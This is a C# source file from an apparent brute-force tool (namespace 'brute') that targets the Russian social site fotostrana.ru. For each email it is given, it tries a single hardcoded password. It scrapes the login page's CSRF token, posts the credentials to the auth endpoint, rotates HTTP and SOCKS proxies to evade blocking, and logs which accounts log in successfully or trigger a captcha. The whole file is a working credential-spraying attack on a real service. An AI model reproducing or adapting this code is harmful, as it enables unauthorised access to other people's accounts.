using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using xNet;
using Newtonsoft.Json;
using HtmlAgilityPack;
using System.Timers;

namespace brute
{
    public class Unit
    {
        //Hello Git
        public Timer Time;
        public bool StopTimer { get; set; } = false;
        public static int Index { get; set; }
        public string ID { get; set; }
        public string Email { get; set; }
        public string Password { get; set; }

        public bool Stop { get; set; } = true;

        public string UserAgent { get; set; }

        public CookieDictionary cookie = new CookieDictionary();

        public string RefID { get; set; }

        public static Random random = new Random();

        Proxy proxy;

        public string ProxyLine { get; set; }

        public Unit(string email)
        {
            Time = new Timer(1000);
            Time.Elapsed += Time_Elapsed;
            Password = "EtaK1la";
            Email = email;
            UserAgent = Http.FirefoxUserAgent();
            RefID = random.Next(143053905, 943053905).ToString();
            cookie.Add("ref_id", RefID);
            Index = Index + 1;
            proxy = Proxy.Settings;
            proxy.ProxyEmpty += Proxy_ProxyEmpty;
        }

        private void Time_Elapsed(object sender, ElapsedEventArgs e)
        {
            StopTimer = true;
        }

        public static void SaveProxy()
        {
     
        }
        private void Proxy_ProxyEmpty(string msg)
        {
            MessageBox.Show(msg);
        }

        public void Registr(out string source)
        {
            source = string.Empty;
            using (var client = new HttpRequest())
            {
                begin:;
                client.UserAgent = UserAgent;
                client.CharacterSet = Encoding.UTF8;
                client.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                client.AddHeader("Accept-Language", "ru - RU,ru; q = 0.8,en - US; q = 0.5,en; q = 0.3");
                client.Cookies = cookie;

                if (proxy.ProxyUse && !proxy.ProxyUseStopEmtpy)
                {
                    if (ProxyLine == null)
                    {
                        ProxyLine = proxy.GetProxyLine();
                    }

                    switch (proxy.ProxyType)
                    {
                        case 0:
                            {
                                client.Proxy = client.Proxy = HttpProxyClient.Parse(ProxyLine);
                                break;
                            }
                        case 1:
                            {
                                client.Proxy = client.Proxy = Socks4ProxyClient.Parse(ProxyLine);
                                break;
                            }
                        case 2:
                            {
                                client.Proxy = client.Proxy = Socks5ProxyClient.Parse(ProxyLine);
                                break;
                            }

                        default:
                            break;
                    }

                    if (proxy.ProxyUseAuth){
                        client.Proxy.Password = proxy.ProxyPassword;
                        client.Proxy.Username = proxy.ProxyLogin;
                    }
                }

                byte[] stream = null;

                try{
                     stream = client.Get("https://fotostrana.ru/signup/login/").ToBytes();
                }
                catch(Exception ex)
                {
                    if (-2146233088 == ex.HResult){
                        proxy.WriteProxy(ProxyLine, 1);
                        ProxyLine = null;
                        goto begin;
                    }
                }


                if (stream != null)
                {
                    using (var sr = new System.IO.StreamReader(new MemoryStream(stream)))
                    {
                        string line = "";
                        while ((line = sr.ReadLine()) != null && Stop)
                        {
                            if (line.Contains("name=\"csrftkn\""))
                            {
                                HtmlAgilityPack.HtmlDocument doc = new HtmlAgilityPack.HtmlDocument();
                                doc.Load(new StringReader(line));
                                HtmlNodeCollection node = doc.DocumentNode.SelectNodes("//input");

                                if (node != null)
                                {
                                    string csrftkn = null;
                                    foreach (HtmlNode docs in node)
                                    {
                                        csrftkn = docs.Attributes["value"].Value;
                                    }

                                    client.CharacterSet = Encoding.Default;
                                    client.AddHeader("Accept-Language", "ru - RU,ru; q = 0.8,en - US; q = 0.5,en; q = 0.3");
                                    client.AddHeader("Accept", @"application/json, text/javascript, */*; q = 0.01");
                                    client.AllowAutoRedirect = true;
                                    client.AddHeader("X-Simple-Token:", csrftkn);
                                    client.AddHeader("X-Requested-With", "XMLHttpRequest");
                                    client.Referer = "https://fotostrana.ru/signup/login/";
                                    client.UserAgent = UserAgent;
                                    client.Cookies = cookie;

                                    string data = $"csrftkn={csrftkn}&user_email={Email}& user_password={Password}&submitted=1& issetFields%5B%5D=csrftkn&issetFields%5B%5D=user_email&issetFields%5B%5D=user_password&issetFields%5B%5D=submitted&_fs2ajax=1";
                                    string s = null;

                                    try
                                    {

                                       s = client.Post("https://fotostrana.ru/signup/signup/auth/", data, "application/x-www-form-urlencoded;charset=UTF-8").ToString();
                                    }
                                    catch(Exception exx)
                                    {
                                        if (-2146233080 == exx.HResult)
                                        {
                                            proxy.WriteProxy(ProxyLine, 1);
                                            ProxyLine = null;
                                            goto begin;
                                        }
                                    }


                                    var result = JsonConvert.DeserializeObject<Rootobject>(s);
                                    // MessageBox.Show(result.ret.ToString());
                                    // MessageBox.Show(result.data.user_id.ToString());

                                    foreach (var item in result.errors)
                                    {
                                        if (item.ToString().Contains("captchaPopup"))
                                        {
                                         

                                            source = "Capcha" + Environment.NewLine + "email " + Email + Environment.NewLine + "id" + result.data.user_id + Environment.NewLine + "result " + result.data.result + Environment.NewLine + "is_login" + result.data.is_login + Environment.NewLine;
                                        }
                                        else
                                        {
                                            source = "email " + Email + Environment.NewLine + "id" + result.data.user_id + Environment.NewLine + "result " + result.data.result + Environment.NewLine + "is_login" + result.data.is_login + Environment.NewLine;
                                        }
                                    }
                                    StopTimer = false;
                                    Stop = false;

                                }
                            }
                        }
                    }
                }
            } //client close
           
        }
    }


    public class Rootobject
    {
        public int ret { get; set; }
        public Data data { get; set; }
        public object[] errors { get; set; }
    }

    public class Data
    {
        public string result { get; set; }
        public string redirect_url { get; set; }
        public string user_id { get; set; }
        public int is_login { get; set; }
    }


}
